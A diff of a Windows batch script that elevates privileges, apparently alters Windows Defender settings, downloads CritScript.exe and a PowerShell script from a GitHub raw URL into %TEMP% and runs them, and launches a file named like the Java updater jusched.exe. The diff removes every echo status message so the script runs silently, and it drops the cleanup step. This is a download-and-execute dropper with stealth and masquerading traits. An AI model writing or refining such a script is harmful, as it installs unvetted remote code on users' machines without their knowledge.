@@ -7,7 +7,6 @@ REM  --> Check for permissions
 
 REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )
 
@@ -31,75 +30,47 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 cd %TEMP%
 
 :: Step 1: Download CritScript.exe using PowerShell
-echo Downloading CritScript.exe...
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut.ps1' -OutFile shortcut.ps1"
 if not exist "CritScript.exe" (
-    echo Failed to download CritScript.exe. Exiting...
     pause
     exit /b
 )
-echo CritScript.exe downloaded successfully.
 
 :: Step 2: Execute CritScript.exe
-echo Running CritScript.exe...
 start "" CritScript.exe
 timeout /t 5 /nobreak
 
 :: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
 for %%F in (jusched.exe JUSCHED.EXE) do (
     if exist "%%F" (
-        echo Found %%F. Running it...
         start "" %%F
         timeout /t 5 /nobreak
         goto :CheckZombies
     )
 )
-echo jusched.exe not found.
 
 :CheckZombies
 :: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
 for %%F in (zombies.ahk ZOMBIES.AHK) do (
     if exist "%%F" (
-        echo Found %%F. Running it...
         start "" %%F
-        goto :DetermineDesktop
     )
-)
-echo Zombies.ahk not found.
-
-:DetermineDesktop
-:: Step 5: Determine the desktop path dynamically
-set "desktopPath=%USERPROFILE%\Desktop"
-if exist "%USERPROFILE%\OneDrive\Desktop" (
-    set "desktopPath=%USERPROFILE%\OneDrive\Desktop"
-)
-echo Using desktop path: %desktopPath%
-
-:DeleteCritScript
-:: Step 6: Delete CritScript.exe if it exists
-if exist "CritScript.exe" (
-    echo Deleting CritScript.exe...
-    del /f /q "CritScript.exe"
-    echo CritScript.exe deleted.
 )
 
 :CreateShortcut
-:: Step 7: Create a shortcut for ZOMBIES.AHK on the determined desktop path
+:: Step 5: Create a shortcut for ZOMBIES.AHK on the determined desktop path
 set "zombiesScript=%TEMP%\ZOMBIES.AHK"
 set "iconPath=%TEMP%\ahk.ico"
 
 if exist "%zombiesScript%" (
-    echo Creating shortcut for ZOMBIES.AHK on the desktop...
     Powershell -ExecutionPolicy Bypass -File "%TEMP%\shortcut.ps1"
-    echo Shortcut created.
 ) else (
-    echo ZOMBIES.AHK not found. Cannot create shortcut.
+
 )
 
 :ExitScript
 :: Exit the script
-echo Script completed. Exiting...
 pause
 exit /b
